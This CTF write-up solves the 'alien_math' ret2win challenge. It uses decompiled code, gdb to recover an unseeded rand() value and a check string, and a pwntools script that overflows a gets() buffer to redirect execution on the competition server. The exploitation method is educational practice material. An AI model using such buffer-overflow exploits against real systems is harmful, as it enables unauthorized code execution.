## Description:
Brush off your Flirbgarple textbooks!

---

A simple ret2win challenge. There is a buffer overflow in the `final_question` function.

```c
  __int64 v1[2]; // [rsp+0h] [rbp-10h] BYREF

  v1[0] = 0LL;
  v1[1] = 0LL;
  puts("How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?");
  fflush(stdout);
  getchar();
  return gets(v1);
```

To get to this one, we need to pass the previous 2 questions.

`first_question`:

```c
...
  puts("\n==== Flirbgarple Math Pop Quiz ====");
  puts("=== Make an A to receive a flag! ===\n");
  puts("What is the square root of zopnol?");
  fflush(stdout);
  __isoc99_scanf(" %d", &v5);
  random_number = rand();
  if ( random_number == v5 )
  {
    puts("Correct!\n");
    fflush(stdout);
    getchar();
    puts("How many tewgrunbs are in a qorbnorbf?");
    fflush(stdout);
    __isoc99_scanf("%24s", v4);
    second_question(v4);
...
```

There was no call to `srand()` before `rand()`, so the random number just stays the same everytime we run the binary. With gdb, we can see that the first input is `1804289383`.

`second_question`:

```c
  int v1; // ebx
  size_t v3; // rax
  char s1[28]; // [rsp+10h] [rbp-30h] BYREF
  int i; // [rsp+2Ch] [rbp-14h]

  for ( i = 0; i < strlen(input) - 1; ++i )
  {
    if ( input[i] <= 47 || input[i] > 57 )
    {
      puts("Xolplsmorp! Invalid input!\n");
      return puts("You get a C. No flag this time.\n");
    }
    v1 = input[i + 1] - 48;
    input[i + 1] = (int)(v1 + second_question_function((unsigned int)input[i], (unsigned int)(i + input[i]))) % 10 + 48;
  }
  strcpy(s1, "7759406485255323229225");
  v3 = strlen(s1);
  if ( strncmp(s1, input, v3) )
    return puts("You get a C. No flag this time.\n");
  puts("Genius! One question left...\n");
  final_question();
  return puts("Not quite. Double check your calculations.\nYou made a B. So close!\n");
```

You can reverse this function to find the correct input, or just be lazy like me and set a breakpoint in gdb to check which value it is compared to. The second input is `7856445899213065428791`.

```python
from pwn import *

# p = process('./alien_math')
p = remote('pwn.chal.csaw.io', 5004)

p.recv()
p.sendline(b'1804289383')

p.recv()
p.sendline(b'7856445899213065428791')

p.recv()

payload = b'a'*24
payload += p64(0x004014fb)

p.sendline(payload)

p.interactive()
```